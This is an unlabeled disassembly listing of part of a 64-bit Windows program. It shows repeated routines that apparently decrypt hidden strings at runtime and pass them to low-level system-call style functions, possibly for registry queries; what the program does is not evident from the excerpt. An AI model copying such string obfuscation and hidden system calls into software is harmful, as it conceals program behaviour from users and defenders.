   1400059b4:	f3 0f 7e 15 74 b2 2b 	movq   0x2bb274(%rip),%xmm2        # 0x1402c0c30
   1400059bb:	00 
   1400059bc:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400059c0:	66 0f db d1          	pand   %xmm1,%xmm2
   1400059c4:	66 0f d6 15 64 b2 2b 	movq   %xmm2,0x2bb264(%rip)        # 0x1402c0c30
   1400059cb:	00 
   1400059cc:	b8 fb 00 00 00       	mov    $0xfb,%eax
   1400059d1:	03 05 61 b2 2b 00    	add    0x2bb261(%rip),%eax        # 0x1402c0c38
   1400059d7:	0f b6 c0             	movzbl %al,%eax
   1400059da:	66 89 05 57 b2 2b 00 	mov    %ax,0x2bb257(%rip)        # 0x1402c0c38
   1400059e1:	0f b7 05 52 b2 2b 00 	movzwl 0x2bb252(%rip),%eax        # 0x1402c0c3a
   1400059e8:	05 fb 00 00 00       	add    $0xfb,%eax
   1400059ed:	0f b6 c0             	movzbl %al,%eax
   1400059f0:	66 89 05 43 b2 2b 00 	mov    %ax,0x2bb243(%rip)        # 0x1402c0c3a
   1400059f7:	c6 05 3e b2 2b 00 00 	movb   $0x0,0x2bb23e(%rip)        # 0x1402c0c3c
   1400059fe:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140005a03:	4c 8d 0d f6 b1 2b 00 	lea    0x2bb1f6(%rip),%r9        # 0x1402c0c00
   140005a0a:	48 8d 95 50 10 00 00 	lea    0x1050(%rbp),%rdx
   140005a11:	31 c9                	xor    %ecx,%ecx
   140005a13:	4d 89 e0             	mov    %r12,%r8
   140005a16:	e8 d5 d3 ff ff       	call   0x140002df0
   140005a1b:	80 3d 7f a8 2b 00 00 	cmpb   $0x0,0x2ba87f(%rip)        # 0x1402c02a1
   140005a22:	0f 84 11 24 00 00    	je     0x140007e39
   140005a28:	80 3d 4d b2 2b 00 00 	cmpb   $0x0,0x2bb24d(%rip)        # 0x1402c0c7c
   140005a2f:	0f 84 de 00 00 00    	je     0x140005b13
   140005a35:	f3 0f 7e 15 03 b2 2b 	movq   0x2bb203(%rip),%xmm2        # 0x1402c0c40
   140005a3c:	00 
   140005a3d:	66 0f 6f 05 9b 5c 00 	movdqa 0x5c9b(%rip),%xmm0        # 0x14000b6e0
   140005a44:	00 
   140005a45:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005a49:	66 0f 6f 0d 0f 5c 00 	movdqa 0x5c0f(%rip),%xmm1        # 0x14000b660
   140005a50:	00 
   140005a51:	66 0f db d1          	pand   %xmm1,%xmm2
   140005a55:	f3 0f 7e 1d eb b1 2b 	movq   0x2bb1eb(%rip),%xmm3        # 0x1402c0c48
   140005a5c:	00 
   140005a5d:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005a61:	66 0f db d9          	pand   %xmm1,%xmm3
   140005a65:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005a69:	f3 0f 7f 15 cf b1 2b 	movdqu %xmm2,0x2bb1cf(%rip)        # 0x1402c0c40
   140005a70:	00 
   140005a71:	f3 0f 7e 15 d7 b1 2b 	movq   0x2bb1d7(%rip),%xmm2        # 0x1402c0c50
   140005a78:	00 
   140005a79:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005a7d:	66 0f db d1          	pand   %xmm1,%xmm2
   140005a81:	f3 0f 7e 1d cf b1 2b 	movq   0x2bb1cf(%rip),%xmm3        # 0x1402c0c58
   140005a88:	00 
   140005a89:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005a8d:	66 0f db d9          	pand   %xmm1,%xmm3
   140005a91:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005a95:	f3 0f 7f 15 b3 b1 2b 	movdqu %xmm2,0x2bb1b3(%rip)        # 0x1402c0c50
   140005a9c:	00 
   140005a9d:	f3 0f 7e 15 bb b1 2b 	movq   0x2bb1bb(%rip),%xmm2        # 0x1402c0c60
   140005aa4:	00 
   140005aa5:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005aa9:	66 0f db d1          	pand   %xmm1,%xmm2
   140005aad:	f3 0f 7e 1d b3 b1 2b 	movq   0x2bb1b3(%rip),%xmm3        # 0x1402c0c68
   140005ab4:	00 
   140005ab5:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005ab9:	66 0f db d9          	pand   %xmm1,%xmm3
   140005abd:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005ac1:	f3 0f 7f 15 97 b1 2b 	movdqu %xmm2,0x2bb197(%rip)        # 0x1402c0c60
   140005ac8:	00 
   140005ac9:	f3 0f 7e 15 9f b1 2b 	movq   0x2bb19f(%rip),%xmm2        # 0x1402c0c70
   140005ad0:	00 
   140005ad1:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005ad5:	66 0f db d1          	pand   %xmm1,%xmm2
   140005ad9:	66 0f d6 15 8f b1 2b 	movq   %xmm2,0x2bb18f(%rip)        # 0x1402c0c70
   140005ae0:	00 
   140005ae1:	b8 c9 00 00 00       	mov    $0xc9,%eax
   140005ae6:	03 05 8c b1 2b 00    	add    0x2bb18c(%rip),%eax        # 0x1402c0c78
   140005aec:	0f b6 c0             	movzbl %al,%eax
   140005aef:	66 89 05 82 b1 2b 00 	mov    %ax,0x2bb182(%rip)        # 0x1402c0c78
   140005af6:	0f b7 05 7d b1 2b 00 	movzwl 0x2bb17d(%rip),%eax        # 0x1402c0c7a
   140005afd:	05 c9 00 00 00       	add    $0xc9,%eax
   140005b02:	0f b6 c0             	movzbl %al,%eax
   140005b05:	66 89 05 6e b1 2b 00 	mov    %ax,0x2bb16e(%rip)        # 0x1402c0c7a
   140005b0c:	c6 05 69 b1 2b 00 00 	movb   $0x0,0x2bb169(%rip)        # 0x1402c0c7c
   140005b13:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140005b18:	4c 8d 0d 21 b1 2b 00 	lea    0x2bb121(%rip),%r9        # 0x1402c0c40
   140005b1f:	48 8d 95 50 10 00 00 	lea    0x1050(%rbp),%rdx
   140005b26:	31 c9                	xor    %ecx,%ecx
   140005b28:	4d 89 e0             	mov    %r12,%r8
   140005b2b:	e8 c0 d2 ff ff       	call   0x140002df0
   140005b30:	80 3d 6b a7 2b 00 00 	cmpb   $0x0,0x2ba76b(%rip)        # 0x1402c02a2
   140005b37:	0f 84 2d 23 00 00    	je     0x140007e6a
   140005b3d:	80 3d 74 b1 2b 00 00 	cmpb   $0x0,0x2bb174(%rip)        # 0x1402c0cb8
   140005b44:	0f 84 b3 00 00 00    	je     0x140005bfd
   140005b4a:	f3 0f 7e 15 2e b1 2b 	movq   0x2bb12e(%rip),%xmm2        # 0x1402c0c80
   140005b51:	00 
   140005b52:	66 0f 6f 05 76 5e 00 	movdqa 0x5e76(%rip),%xmm0        # 0x14000b9d0
   140005b59:	00 
   140005b5a:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005b5e:	66 0f 6f 0d fa 5a 00 	movdqa 0x5afa(%rip),%xmm1        # 0x14000b660
   140005b65:	00 
   140005b66:	66 0f db d1          	pand   %xmm1,%xmm2
   140005b6a:	f3 0f 7e 1d 16 b1 2b 	movq   0x2bb116(%rip),%xmm3        # 0x1402c0c88
   140005b71:	00 
   140005b72:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005b76:	66 0f db d9          	pand   %xmm1,%xmm3
   140005b7a:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005b7e:	f3 0f 7f 15 fa b0 2b 	movdqu %xmm2,0x2bb0fa(%rip)        # 0x1402c0c80
   140005b85:	00 
   140005b86:	f3 0f 7e 15 02 b1 2b 	movq   0x2bb102(%rip),%xmm2        # 0x1402c0c90
   140005b8d:	00 
   140005b8e:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005b92:	66 0f db d1          	pand   %xmm1,%xmm2
   140005b96:	f3 0f 7e 1d fa b0 2b 	movq   0x2bb0fa(%rip),%xmm3        # 0x1402c0c98
   140005b9d:	00 
   140005b9e:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005ba2:	66 0f db d9          	pand   %xmm1,%xmm3
   140005ba6:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005baa:	f3 0f 7f 15 de b0 2b 	movdqu %xmm2,0x2bb0de(%rip)        # 0x1402c0c90
   140005bb1:	00 
   140005bb2:	f3 0f 7e 15 e6 b0 2b 	movq   0x2bb0e6(%rip),%xmm2        # 0x1402c0ca0
   140005bb9:	00 
   140005bba:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005bbe:	66 0f db d1          	pand   %xmm1,%xmm2
   140005bc2:	f3 0f 7e 1d de b0 2b 	movq   0x2bb0de(%rip),%xmm3        # 0x1402c0ca8
   140005bc9:	00 
   140005bca:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005bce:	66 0f db d9          	pand   %xmm1,%xmm3
   140005bd2:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005bd6:	f3 0f 7f 15 c2 b0 2b 	movdqu %xmm2,0x2bb0c2(%rip)        # 0x1402c0ca0
   140005bdd:	00 
   140005bde:	f3 0f 7e 15 ca b0 2b 	movq   0x2bb0ca(%rip),%xmm2        # 0x1402c0cb0
   140005be5:	00 
   140005be6:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005bea:	66 0f db d1          	pand   %xmm1,%xmm2
   140005bee:	66 0f d6 15 ba b0 2b 	movq   %xmm2,0x2bb0ba(%rip)        # 0x1402c0cb0
   140005bf5:	00 
   140005bf6:	c6 05 bb b0 2b 00 00 	movb   $0x0,0x2bb0bb(%rip)        # 0x1402c0cb8
   140005bfd:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140005c02:	4c 8d 0d 77 b0 2b 00 	lea    0x2bb077(%rip),%r9        # 0x1402c0c80
   140005c09:	4c 8d bd 50 10 00 00 	lea    0x1050(%rbp),%r15
   140005c10:	31 c9                	xor    %ecx,%ecx
   140005c12:	4c 89 fa             	mov    %r15,%rdx
   140005c15:	4d 89 e0             	mov    %r12,%r8
   140005c18:	e8 d3 d1 ff ff       	call   0x140002df0
   140005c1d:	80 3d 7f a6 2b 00 00 	cmpb   $0x0,0x2ba67f(%rip)        # 0x1402c02a3
   140005c24:	0f 84 71 22 00 00    	je     0x140007e9b
   140005c2a:	80 3d c7 b0 2b 00 00 	cmpb   $0x0,0x2bb0c7(%rip)        # 0x1402c0cf8
   140005c31:	0f 84 b3 00 00 00    	je     0x140005cea
   140005c37:	f3 0f 7e 15 81 b0 2b 	movq   0x2bb081(%rip),%xmm2        # 0x1402c0cc0
   140005c3e:	00 
   140005c3f:	66 0f 6f 05 99 5d 00 	movdqa 0x5d99(%rip),%xmm0        # 0x14000b9e0
   140005c46:	00 
   140005c47:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005c4b:	66 0f 6f 0d 0d 5a 00 	movdqa 0x5a0d(%rip),%xmm1        # 0x14000b660
   140005c52:	00 
   140005c53:	66 0f db d1          	pand   %xmm1,%xmm2
   140005c57:	f3 0f 7e 1d 69 b0 2b 	movq   0x2bb069(%rip),%xmm3        # 0x1402c0cc8
   140005c5e:	00 
   140005c5f:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005c63:	66 0f db d9          	pand   %xmm1,%xmm3
   140005c67:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005c6b:	f3 0f 7f 15 4d b0 2b 	movdqu %xmm2,0x2bb04d(%rip)        # 0x1402c0cc0
   140005c72:	00 
   140005c73:	f3 0f 7e 15 55 b0 2b 	movq   0x2bb055(%rip),%xmm2        # 0x1402c0cd0
   140005c7a:	00 
   140005c7b:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005c7f:	66 0f db d1          	pand   %xmm1,%xmm2
   140005c83:	f3 0f 7e 1d 4d b0 2b 	movq   0x2bb04d(%rip),%xmm3        # 0x1402c0cd8
   140005c8a:	00 
   140005c8b:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005c8f:	66 0f db d9          	pand   %xmm1,%xmm3
   140005c93:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005c97:	f3 0f 7f 15 31 b0 2b 	movdqu %xmm2,0x2bb031(%rip)        # 0x1402c0cd0
   140005c9e:	00 
   140005c9f:	f3 0f 7e 15 39 b0 2b 	movq   0x2bb039(%rip),%xmm2        # 0x1402c0ce0
   140005ca6:	00 
   140005ca7:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005cab:	66 0f db d1          	pand   %xmm1,%xmm2
   140005caf:	f3 0f 7e 1d 31 b0 2b 	movq   0x2bb031(%rip),%xmm3        # 0x1402c0ce8
   140005cb6:	00 
   140005cb7:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005cbb:	66 0f db d9          	pand   %xmm1,%xmm3
   140005cbf:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005cc3:	f3 0f 7f 15 15 b0 2b 	movdqu %xmm2,0x2bb015(%rip)        # 0x1402c0ce0
   140005cca:	00 
   140005ccb:	f3 0f 7e 15 1d b0 2b 	movq   0x2bb01d(%rip),%xmm2        # 0x1402c0cf0
   140005cd2:	00 
   140005cd3:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005cd7:	66 0f db d1          	pand   %xmm1,%xmm2
   140005cdb:	66 0f d6 15 0d b0 2b 	movq   %xmm2,0x2bb00d(%rip)        # 0x1402c0cf0
   140005ce2:	00 
   140005ce3:	c6 05 0e b0 2b 00 00 	movb   $0x0,0x2bb00e(%rip)        # 0x1402c0cf8
   140005cea:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140005cef:	4c 8d 0d ca af 2b 00 	lea    0x2bafca(%rip),%r9        # 0x1402c0cc0
   140005cf6:	31 c9                	xor    %ecx,%ecx
   140005cf8:	4c 89 fa             	mov    %r15,%rdx
   140005cfb:	4d 89 e0             	mov    %r12,%r8
   140005cfe:	e8 ed d0 ff ff       	call   0x140002df0
   140005d03:	48 8d 0d d6 59 28 00 	lea    0x2859d6(%rip),%rcx        # 0x14028b6e0
   140005d0a:	4c 8d a5 f0 16 00 00 	lea    0x16f0(%rbp),%r12
   140005d11:	ba ac 4a 03 00       	mov    $0x34aac,%edx
   140005d16:	4d 89 e0             	mov    %r12,%r8
   140005d19:	e8 52 d2 ff ff       	call   0x140002f70
   140005d1e:	49 89 c6             	mov    %rax,%r14
   140005d21:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140005d26:	48 8d 8d 10 08 00 00 	lea    0x810(%rbp),%rcx
   140005d2d:	48 89 ca             	mov    %rcx,%rdx
   140005d30:	45 31 c0             	xor    %r8d,%r8d
   140005d33:	49 89 c1             	mov    %rax,%r9
   140005d36:	e8 75 dc ff ff       	call   0x1400039b0
   140005d3b:	49 89 c5             	mov    %rax,%r13
   140005d3e:	48 8b 85 f0 16 00 00 	mov    0x16f0(%rbp),%rax
   140005d45:	48 89 85 60 12 00 00 	mov    %rax,0x1260(%rbp)
   140005d4c:	4c 89 b5 70 14 00 00 	mov    %r14,0x1470(%rbp)
   140005d53:	48 8d 95 70 14 00 00 	lea    0x1470(%rbp),%rdx
   140005d5a:	4c 8d 85 60 12 00 00 	lea    0x1260(%rbp),%r8
   140005d61:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140005d68:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   140005d6e:	e8 54 b7 ff ff       	call   0x1400014c7
   140005d73:	49 83 fd ff          	cmp    $0xffffffffffffffff,%r13
   140005d77:	74 08                	je     0x140005d81
   140005d79:	4c 89 e9             	mov    %r13,%rcx
   140005d7c:	e8 dd b6 ff ff       	call   0x14000145e
   140005d81:	48 c7 85 30 17 00 00 	movq   $0x0,0x1730(%rbp)
   140005d88:	00 00 00 00 
   140005d8c:	80 3d e7 a4 2b 00 00 	cmpb   $0x0,0x2ba4e7(%rip)        # 0x1402c027a
   140005d93:	0f 84 33 21 00 00    	je     0x140007ecc
   140005d99:	80 3d ba a5 2b 00 00 	cmpb   $0x0,0x2ba5ba(%rip)        # 0x1402c035a
   140005da0:	0f 84 1c 01 00 00    	je     0x140005ec2
   140005da6:	66 0f 6f 05 e2 59 00 	movdqa 0x59e2(%rip),%xmm0        # 0x14000b790
   140005dad:	00 
   140005dae:	66 0f 6f 15 2a a5 2b 	movdqa 0x2ba52a(%rip),%xmm2        # 0x1402c02e0
   140005db5:	00 
   140005db6:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005dba:	66 0f 6f 0d 5e 58 00 	movdqa 0x585e(%rip),%xmm1        # 0x14000b620
   140005dc1:	00 
   140005dc2:	66 0f db d1          	pand   %xmm1,%xmm2
   140005dc6:	66 0f 7f 15 12 a5 2b 	movdqa %xmm2,0x2ba512(%rip)        # 0x1402c02e0
   140005dcd:	00 
   140005dce:	66 0f 6f 15 1a a5 2b 	movdqa 0x2ba51a(%rip),%xmm2        # 0x1402c02f0
   140005dd5:	00 
   140005dd6:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005dda:	66 0f db d1          	pand   %xmm1,%xmm2
   140005dde:	66 0f 7f 15 0a a5 2b 	movdqa %xmm2,0x2ba50a(%rip)        # 0x1402c02f0
   140005de5:	00 
   140005de6:	66 0f 6f 15 12 a5 2b 	movdqa 0x2ba512(%rip),%xmm2        # 0x1402c0300
   140005ded:	00 
   140005dee:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005df2:	66 0f db d1          	pand   %xmm1,%xmm2
   140005df6:	66 0f 7f 15 02 a5 2b 	movdqa %xmm2,0x2ba502(%rip)        # 0x1402c0300
   140005dfd:	00 
   140005dfe:	66 0f 6f 15 0a a5 2b 	movdqa 0x2ba50a(%rip),%xmm2        # 0x1402c0310
   140005e05:	00 
   140005e06:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005e0a:	66 0f db d1          	pand   %xmm1,%xmm2
   140005e0e:	66 0f 7f 15 fa a4 2b 	movdqa %xmm2,0x2ba4fa(%rip)        # 0x1402c0310
   140005e15:	00 
   140005e16:	66 0f 6f 15 02 a5 2b 	movdqa 0x2ba502(%rip),%xmm2        # 0x1402c0320
   140005e1d:	00 
   140005e1e:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005e22:	66 0f db d1          	pand   %xmm1,%xmm2
   140005e26:	66 0f 7f 15 f2 a4 2b 	movdqa %xmm2,0x2ba4f2(%rip)        # 0x1402c0320
   140005e2d:	00 
   140005e2e:	66 0f 6f 15 fa a4 2b 	movdqa 0x2ba4fa(%rip),%xmm2        # 0x1402c0330
   140005e35:	00 
   140005e36:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005e3a:	66 0f db d1          	pand   %xmm1,%xmm2
   140005e3e:	66 0f 7f 15 ea a4 2b 	movdqa %xmm2,0x2ba4ea(%rip)        # 0x1402c0330
   140005e45:	00 
   140005e46:	66 0f fd 05 f2 a4 2b 	paddw  0x2ba4f2(%rip),%xmm0        # 0x1402c0340
   140005e4d:	00 
   140005e4e:	66 0f db c1          	pand   %xmm1,%xmm0
   140005e52:	66 0f 7f 05 e6 a4 2b 	movdqa %xmm0,0x2ba4e6(%rip)        # 0x1402c0340
   140005e59:	00 
   140005e5a:	8b 05 f0 a4 2b 00    	mov    0x2ba4f0(%rip),%eax        # 0x1402c0350
   140005e60:	83 c0 0b             	add    $0xb,%eax
   140005e63:	0f b6 c0             	movzbl %al,%eax
   140005e66:	66 89 05 e3 a4 2b 00 	mov    %ax,0x2ba4e3(%rip)        # 0x1402c0350
   140005e6d:	0f b7 05 de a4 2b 00 	movzwl 0x2ba4de(%rip),%eax        # 0x1402c0352
   140005e74:	83 c0 0b             	add    $0xb,%eax
   140005e77:	0f b6 c0             	movzbl %al,%eax
   140005e7a:	66 89 05 d1 a4 2b 00 	mov    %ax,0x2ba4d1(%rip)        # 0x1402c0352
   140005e81:	8b 05 cd a4 2b 00    	mov    0x2ba4cd(%rip),%eax        # 0x1402c0354
   140005e87:	83 c0 0b             	add    $0xb,%eax
   140005e8a:	0f b6 c0             	movzbl %al,%eax
   140005e8d:	66 89 05 c0 a4 2b 00 	mov    %ax,0x2ba4c0(%rip)        # 0x1402c0354
   140005e94:	0f b7 05 bb a4 2b 00 	movzwl 0x2ba4bb(%rip),%eax        # 0x1402c0356
   140005e9b:	83 c0 0b             	add    $0xb,%eax
   140005e9e:	0f b6 c0             	movzbl %al,%eax
   140005ea1:	66 89 05 ae a4 2b 00 	mov    %ax,0x2ba4ae(%rip)        # 0x1402c0356
   140005ea8:	8b 05 aa a4 2b 00    	mov    0x2ba4aa(%rip),%eax        # 0x1402c0358
   140005eae:	83 c0 0b             	add    $0xb,%eax
   140005eb1:	0f b6 c0             	movzbl %al,%eax
   140005eb4:	66 89 05 9d a4 2b 00 	mov    %ax,0x2ba49d(%rip)        # 0x1402c0358
   140005ebb:	c6 05 98 a4 2b 00 00 	movb   $0x0,0x2ba498(%rip)        # 0x1402c035a
   140005ec2:	48 c7 85 f0 16 00 00 	movq   $0x0,0x16f0(%rbp)
   140005ec9:	00 00 00 00 
   140005ecd:	4c 8d 35 0c a4 2b 00 	lea    0x2ba40c(%rip),%r14        # 0x1402c02e0
   140005ed4:	4c 89 f1             	mov    %r14,%rcx
   140005ed7:	e8 24 47 00 00       	call   0x14000a600
   140005edc:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140005ee3:	01 c0                	add    %eax,%eax
   140005ee5:	66 89 8d f2 16 00 00 	mov    %cx,0x16f2(%rbp)
   140005eec:	66 89 85 f0 16 00 00 	mov    %ax,0x16f0(%rbp)
   140005ef3:	4c 89 b5 f8 16 00 00 	mov    %r14,0x16f8(%rbp)
   140005efa:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140005efe:	66 0f 7f 85 70 14 00 	movdqa %xmm0,0x1470(%rbp)
   140005f05:	00 
   140005f06:	66 0f 7f 85 80 14 00 	movdqa %xmm0,0x1480(%rbp)
   140005f0d:	00 
   140005f0e:	c7 85 70 14 00 00 30 	movl   $0x30,0x1470(%rbp)
   140005f15:	00 00 00 
   140005f18:	c7 85 88 14 00 00 40 	movl   $0x40,0x1488(%rbp)
   140005f1f:	00 00 00 
   140005f22:	4c 89 a5 80 14 00 00 	mov    %r12,0x1480(%rbp)
   140005f29:	66 0f 7f 85 90 14 00 	movdqa %xmm0,0x1490(%rbp)
   140005f30:	00 
   140005f31:	48 8d 8d 30 17 00 00 	lea    0x1730(%rbp),%rcx
   140005f38:	4c 8d a5 70 14 00 00 	lea    0x1470(%rbp),%r12
   140005f3f:	ba 01 00 00 00       	mov    $0x1,%edx
   140005f44:	4d 89 e0             	mov    %r12,%r8
   140005f47:	e8 2f b6 ff ff       	call   0x14000157b
   140005f4c:	85 c0                	test   %eax,%eax
   140005f4e:	0f 88 12 01 00 00    	js     0x140006066
   140005f54:	48 8d 8d 60 12 00 00 	lea    0x1260(%rbp),%rcx
   140005f5b:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   140005f61:	31 d2                	xor    %edx,%edx
   140005f63:	e8 78 47 00 00       	call   0x14000a6e0
   140005f68:	80 3d 0c a3 2b 00 00 	cmpb   $0x0,0x2ba30c(%rip)        # 0x1402c027b
   140005f6f:	0f 84 e2 20 00 00    	je     0x140008057
   140005f75:	80 3d f8 a3 2b 00 00 	cmpb   $0x0,0x2ba3f8(%rip)        # 0x1402c0374
   140005f7c:	74 47                	je     0x140005fc5
   140005f7e:	66 0f 6f 05 da a3 2b 	movdqa 0x2ba3da(%rip),%xmm0        # 0x1402c0360
   140005f85:	00 
   140005f86:	66 0f fd 05 72 5a 00 	paddw  0x5a72(%rip),%xmm0        # 0x14000ba00
   140005f8d:	00 
   140005f8e:	66 0f db 05 8a 56 00 	pand   0x568a(%rip),%xmm0        # 0x14000b620
   140005f95:	00 
   140005f96:	66 0f 7f 05 c2 a3 2b 	movdqa %xmm0,0x2ba3c2(%rip)        # 0x1402c0360
   140005f9d:	00 
   140005f9e:	66 0f 6f 05 ca a3 2b 	movdqa 0x2ba3ca(%rip),%xmm0        # 0x1402c0370
   140005fa5:	00 
   140005fa6:	66 0f fd 05 62 5a 00 	paddw  0x5a62(%rip),%xmm0        # 0x14000ba10
   140005fad:	00 
   140005fae:	66 0f db 05 da 56 00 	pand   0x56da(%rip),%xmm0        # 0x14000b690
   140005fb5:	00 
   140005fb6:	66 0f 7e 05 b2 a3 2b 	movd   %xmm0,0x2ba3b2(%rip)        # 0x1402c0370
   140005fbd:	00 
   140005fbe:	c6 05 af a3 2b 00 00 	movb   $0x0,0x2ba3af(%rip)        # 0x1402c0374
   140005fc5:	48 c7 85 40 17 00 00 	movq   $0x0,0x1740(%rbp)
   140005fcc:	00 00 00 00 
   140005fd0:	4c 8d 35 89 a3 2b 00 	lea    0x2ba389(%rip),%r14        # 0x1402c0360
   140005fd7:	4c 89 f1             	mov    %r14,%rcx
   140005fda:	e8 21 46 00 00       	call   0x14000a600
   140005fdf:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140005fe6:	01 c0                	add    %eax,%eax
   140005fe8:	66 89 8d 42 17 00 00 	mov    %cx,0x1742(%rbp)
   140005fef:	66 89 85 40 17 00 00 	mov    %ax,0x1740(%rbp)
   140005ff6:	4c 89 b5 48 17 00 00 	mov    %r14,0x1748(%rbp)
   140005ffd:	48 8b 8d 30 17 00 00 	mov    0x1730(%rbp),%rcx
   140006004:	4c 8d ad 28 17 00 00 	lea    0x1728(%rbp),%r13
   14000600b:	4c 89 6c 24 28       	mov    %r13,0x28(%rsp)
   140006010:	c7 44 24 20 00 02 00 	movl   $0x200,0x20(%rsp)
   140006017:	00 
   140006018:	48 8d 95 40 17 00 00 	lea    0x1740(%rbp),%rdx
   14000601f:	4c 8d 8d 60 12 00 00 	lea    0x1260(%rbp),%r9
   140006026:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000602c:	e8 77 b5 ff ff       	call   0x1400015a8
   140006031:	85 c0                	test   %eax,%eax
   140006033:	78 25                	js     0x14000605a
   140006035:	48 8d 95 6c 12 00 00 	lea    0x126c(%rbp),%rdx
   14000603c:	44 8b 85 68 12 00 00 	mov    0x1268(%rbp),%r8d
   140006043:	41 d1 e8             	shr    $1,%r8d
   140006046:	48 8d 8d 20 0a 00 00 	lea    0xa20(%rbp),%rcx
   14000604d:	e8 3e 46 00 00       	call   0x14000a690
   140006052:	85 c0                	test   %eax,%eax
   140006054:	0f 84 d7 07 00 00    	je     0x140006831
   14000605a:	48 8b 8d 30 17 00 00 	mov    0x1730(%rbp),%rcx
   140006061:	e8 f8 b3 ff ff       	call   0x14000145e
   140006066:	80 3d 37 a2 2b 00 00 	cmpb   $0x0,0x2ba237(%rip)        # 0x1402c02a4
   14000606d:	0f 84 f7 1e 00 00    	je     0x140007f6a
   140006073:	80 3d b0 ac 2b 00 00 	cmpb   $0x0,0x2bacb0(%rip)        # 0x1402c0d2a
   14000607a:	74 78                	je     0x1400060f4
   14000607c:	66 0f 6f 05 ac 59 00 	movdqa 0x59ac(%rip),%xmm0        # 0x14000ba30
   140006083:	00 
   140006084:	66 0f 6f 0d 74 ac 2b 	movdqa 0x2bac74(%rip),%xmm1        # 0x1402c0d00
   14000608b:	00 
   14000608c:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140006090:	66 0f 6f 15 88 55 00 	movdqa 0x5588(%rip),%xmm2        # 0x14000b620
   140006097:	00 
   140006098:	66 0f db ca          	pand   %xmm2,%xmm1
   14000609c:	66 0f 7f 0d 5c ac 2b 	movdqa %xmm1,0x2bac5c(%rip)        # 0x1402c0d00
   1400060a3:	00 
   1400060a4:	66 0f fd 05 64 ac 2b 	paddw  0x2bac64(%rip),%xmm0        # 0x1402c0d10
   1400060ab:	00 
   1400060ac:	66 0f db c2          	pand   %xmm2,%xmm0
   1400060b0:	66 0f 7f 05 58 ac 2b 	movdqa %xmm0,0x2bac58(%rip)        # 0x1402c0d10
   1400060b7:	00 
   1400060b8:	f3 0f 7e 05 60 ac 2b 	movq   0x2bac60(%rip),%xmm0        # 0x1402c0d20
   1400060bf:	00 
   1400060c0:	66 0f fd 05 78 59 00 	paddw  0x5978(%rip),%xmm0        # 0x14000ba40
   1400060c7:	00 
   1400060c8:	66 0f db 05 90 55 00 	pand   0x5590(%rip),%xmm0        # 0x14000b660
   1400060cf:	00 
   1400060d0:	66 0f d6 05 48 ac 2b 	movq   %xmm0,0x2bac48(%rip)        # 0x1402c0d20
   1400060d7:	00 
   1400060d8:	b8 f9 00 00 00       	mov    $0xf9,%eax
   1400060dd:	03 05 45 ac 2b 00    	add    0x2bac45(%rip),%eax        # 0x1402c0d28
   1400060e3:	0f b6 c0             	movzbl %al,%eax
   1400060e6:	66 89 05 3b ac 2b 00 	mov    %ax,0x2bac3b(%rip)        # 0x1402c0d28
   1400060ed:	c6 05 36 ac 2b 00 00 	movb   $0x0,0x2bac36(%rip)        # 0x1402c0d2a
   1400060f4:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400060f9:	4c 8d 0d 00 ac 2b 00 	lea    0x2bac00(%rip),%r9        # 0x1402c0d00
   140006100:	48 8d 95 50 10 00 00 	lea    0x1050(%rbp),%rdx
   140006107:	b1 01                	mov    $0x1,%cl
   140006109:	49 89 f8             	mov    %rdi,%r8
   14000610c:	e8 df cc ff ff       	call   0x140002df0
   140006111:	80 3d 8d a1 2b 00 00 	cmpb   $0x0,0x2ba18d(%rip)        # 0x1402c02a5
   140006118:	0f 84 7d 1e 00 00    	je     0x140007f9b
   14000611e:	80 3d 6d ac 2b 00 00 	cmpb   $0x0,0x2bac6d(%rip)        # 0x1402c0d92
   140006125:	0f 84 b6 00 00 00    	je     0x1400061e1
